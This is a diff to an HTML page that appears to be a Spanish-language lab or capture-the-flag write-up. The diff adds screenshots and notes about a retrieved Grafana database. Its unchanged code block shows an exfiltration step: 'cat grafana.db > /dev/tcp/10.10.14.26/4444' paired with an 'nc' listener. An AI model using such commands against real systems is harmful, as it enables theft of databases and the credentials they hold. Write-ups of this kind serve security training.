@@ -180,14 +180,13 @@ netstat -tulnp
   cat grafana.db > /dev/tcp/10.10.14.26/4444 
   nc -lvnp 4444 > grafana.db       
 </code></pre>
-<p>.</p>
-
-
-
+<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-28%20173009.png?raw=true" alt="Captura de pantalla">
+<p>El archivo fue enviado con exito.</p>
+<p>Es un archivo MSQL.</p>
 <pre><code>
-             
+https://inloop.github.io/sqlite-viewer/             
 </code></pre>
-
+<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-27%20232844.png?raw=true" alt="Captura de pantalla">
 
 
 <pre><code>
